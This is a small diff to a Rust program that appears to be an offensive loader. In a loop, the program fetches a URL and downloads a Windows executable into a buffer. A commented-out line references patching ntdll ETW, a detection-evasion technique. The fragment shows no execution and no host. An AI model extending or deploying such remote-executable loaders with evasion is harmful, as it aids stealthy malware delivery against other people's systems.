@@ -82,6 +82,7 @@ fn main(){
     println!("[>] Exe who?");
     //new_ntdll_patch_etw().expect("Patching not okie");
     loop {
+        let mut pe_buf: Vec<u8> = Vec::new();
         println!();
         let url_str = match fetch::fetch_url(){
             Ok(_res) => _res,
@@ -110,13 +111,14 @@ fn main(){
         };
 
         // Fetch PE
-        match fetch::fetch_pe(url) {
+        pe_buf = match fetch::fetch_pe(url) {
             Ok(_v) => _v,
             Err(e) => {
                 eprintln!("[!] Error occurred as: {}", e);
                 continue;
             }
         };
+
 
     }
 
